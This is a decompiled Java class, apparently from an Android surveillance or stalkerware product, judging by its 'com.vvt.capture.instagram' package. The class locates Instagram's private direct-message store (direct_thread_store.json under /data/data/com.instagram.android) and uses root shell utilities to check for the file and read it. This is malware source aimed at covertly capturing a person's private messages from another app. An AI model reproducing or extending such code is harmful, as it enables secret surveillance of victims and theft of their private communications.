package com.vvt.capture.instagram;

import com.vvt.io.p;
import com.vvt.shell.LinuxFile;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;

public class a
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  
  public static String a()
  {
    boolean bool1 = b;
    if (bool1) {}
    String str1 = "direct_thread_store.json";
    String str2 = p.a("/data/data/com.instagram.android/files", str1);
    boolean bool2 = ShellUtil.b(str2);
    if (!bool2)
    {
      str2 = p.a("/data/data/com.instagram.android/cache", "direct_thread_store");
      str1 = "direct_thread_store.clean";
      str2 = p.a(str2, str1);
    }
    bool2 = b;
    if (bool2) {}
    return str2;
  }
  
  public static String a(String paramString)
  {
    String str = null;
    ArrayList localArrayList = LinuxFile.a(paramString);
    int i = localArrayList.size();
    if (i > 0) {
      str = ((LinuxFile)localArrayList.get(0)).c();
    }
    return str;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/instagram/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */